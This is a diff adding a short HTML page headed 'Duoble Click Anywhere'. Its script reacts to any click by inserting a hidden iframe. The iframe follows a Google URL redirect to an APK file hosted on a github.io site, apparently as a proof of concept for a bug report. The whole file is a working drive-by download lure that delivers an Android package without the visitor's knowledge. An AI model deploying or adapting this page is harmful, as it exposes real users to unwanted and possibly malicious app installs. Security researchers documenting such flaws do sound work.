@@ -1,0 +1,15 @@
+<body></body>
+<h1>Duoble Click Anywhere</h1>
+
+<script>
+    document.body.onclick = (event) => {
+        const isInputOrButton = event.target.tagName === 'INPUT' || event.target.tagName === 'BUTTON';
+        
+            setTimeout(() => {
+                var iframe = document.createElement('iframe');
+                iframe.src = 'https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }, 100);
+        };
+</script>
